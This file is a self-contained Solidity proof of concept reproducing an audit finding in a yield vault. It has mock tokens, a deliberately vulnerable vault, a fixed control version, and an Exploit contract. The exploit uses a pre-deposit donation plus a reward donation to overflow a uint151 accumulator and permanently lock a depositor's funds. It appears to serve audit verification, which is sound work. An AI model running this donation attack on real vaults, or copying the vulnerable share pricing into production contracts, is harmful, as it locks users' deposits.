// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Balmy Earn — Cantina, November 2024.
    A 1 ether donation before the first deposit prices shares off the raw
    balance, so a 1 ether deposit mints 999 shares. Donating 1 ether + 100_000
    of the reward token then sets the yield accumulator to the exact value in
    the report, which does not fit in uint151. _encode reverts and the
    depositor's 1 ether cannot be withdrawn. The control prices the first
    deposit off zero assets, the accumulator fits, and the 1 ether comes back.
*/

library Math {
    function mulDiv(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return (a * b) / c;
    }
}

library CustomUintSizeChecks {
    error UintOverflowed(uint256 value, uint256 max);
    uint256 private constant MAX_UINT_151 = 2 ** 151 - 1;

    function assertFitsInUint151(uint256 value) internal pure {
        if (value > MAX_UINT_151) revert UintOverflowed(value, MAX_UINT_151);
    }
}

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory sym) {
        symbol = sym;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract EarnVault {
    using Math for uint256;
    using CustomUintSizeChecks for uint256;

    uint256 internal constant ACCUM_PRECISION = 1e33;
    uint256 internal constant SHARES_OFFSET = 1e3;
    uint256 internal constant MAX_UINT_151 = 2 ** 151 - 1;

    Token public asset;
    Token public reward;
    uint256 public totalShares;
    uint256 public lastAsset;
    uint256 public lastReward;
    uint256 public rewardAccum;
    mapping(address => uint256) public sharesOf;
    mapping(address => uint256) public deposited;

    constructor(Token _asset, Token _reward) {
        asset = _asset;
        reward = _reward;
    }

    function donateAsset(uint256 amount) external {
        asset.mint(address(this), amount);
        lastAsset += amount;
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 totalAssets = asset.balanceOf(address(this));
        return assets.mulDiv(totalShares + SHARES_OFFSET, totalAssets + 1);
    }

    function deposit(uint256 amount) external {
        uint256 minted = convertToShares(amount);
        require(asset.transferFrom(msg.sender, address(this), amount), "pull");
        sharesOf[msg.sender] += minted;
        totalShares += minted;
        deposited[msg.sender] += amount;
        lastAsset = asset.balanceOf(address(this));
    }

    function donateReward(uint256 amount) external {
        reward.mint(address(this), amount);
    }

    function previewRewardAccum() public view returns (uint256) {
        uint256 current = reward.balanceOf(address(this));
        uint256 yieldPerShare = ACCUM_PRECISION.mulDiv(current - lastReward, totalShares);
        return rewardAccum + yieldPerShare;
    }

    function _encode(uint256 yieldAccumulator, uint256 balance, uint256 hadLoss) internal pure returns (uint256) {
        // @> VULN: the donated reward pushes yieldAccumulator past uint151 and this check reverts the withdrawal
        if (yieldAccumulator > 2 ** 151 - 1) revert CustomUintSizeChecks.UintOverflowed(yieldAccumulator, 2 ** 151 - 1);
        return (yieldAccumulator << 105) | (balance << 1) | hadLoss;
    }

    function withdraw() external {
        uint256 accum = previewRewardAccum();
        rewardAccum = _encode(accum, reward.balanceOf(address(this)), 0);
        lastReward = reward.balanceOf(address(this));
        uint256 amount = deposited[msg.sender];
        deposited[msg.sender] = 0;
        require(asset.transfer(msg.sender, amount), "asset");
    }
}

contract EarnVaultFixed {
    using Math for uint256;

    uint256 internal constant ACCUM_PRECISION = 1e33;
    uint256 internal constant SHARES_OFFSET = 1e3;

    Token public asset;
    Token public reward;
    uint256 public totalShares;
    uint256 public lastReward;
    mapping(address => uint256) public sharesOf;
    mapping(address => uint256) public deposited;

    constructor(Token _asset, Token _reward) {
        asset = _asset;
        reward = _reward;
    }

    function donateAsset(uint256 amount) external {
        asset.mint(address(this), amount);
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 totalAssets = asset.balanceOf(address(this));
        if (totalShares == 0) totalAssets = 0;
        return assets.mulDiv(totalShares + SHARES_OFFSET, totalAssets + 1);
    }

    function deposit(uint256 amount) external {
        uint256 minted = convertToShares(amount);
        require(asset.transferFrom(msg.sender, address(this), amount), "pull");
        sharesOf[msg.sender] += minted;
        totalShares += minted;
        deposited[msg.sender] += amount;
    }

    function donateReward(uint256 amount) external {
        reward.mint(address(this), amount);
    }

    function previewRewardAccum() public view returns (uint256) {
        uint256 current = reward.balanceOf(address(this));
        return ACCUM_PRECISION.mulDiv(current - lastReward, totalShares);
    }

    function withdraw() external {
        uint256 accum = previewRewardAccum();
        require(accum <= 2 ** 151 - 1, "fits");
        uint256 amount = deposited[msg.sender];
        deposited[msg.sender] = 0;
        require(asset.transfer(msg.sender, amount), "asset");
    }
}

contract Exploit {
    uint256 public constant ONE = 1 ether;
    uint256 public constant REWARD_DONATION = 1 ether + 100_000;
    uint256 public constant REPORTED_ACCUM = 1001001001001101101101101101101101101101101101101;

    Token public asset;
    Token public reward;
    EarnVault public vault;
    uint256 public shares;
    uint256 public accum;
    bool public withdrawReverted;
    uint256 public locked;

    constructor() {
        asset = new Token("ASSET");
        reward = new Token("RWD");
        vault = new EarnVault(asset, reward);
        vault.donateAsset(ONE);
        asset.mint(address(this), ONE);
    }

    function run() external {
        asset.approve(address(vault), ONE);
        vault.deposit(ONE);
        shares = vault.sharesOf(address(this));
        vault.donateReward(REWARD_DONATION);
        accum = vault.previewRewardAccum();
        (bool ok,) = address(vault).call(abi.encodeWithSelector(vault.withdraw.selector));
        withdrawReverted = !ok;
        locked = asset.balanceOf(address(vault));
        require(shares == 999, "shares");
        require(accum == REPORTED_ACCUM, "accum");
        require(accum > 2 ** 151 - 1, "cap");
        require(withdrawReverted, "withdrew");
        require(asset.balanceOf(address(this)) == 0, "user");
        require(locked == ONE * 2, "locked");
    }
}
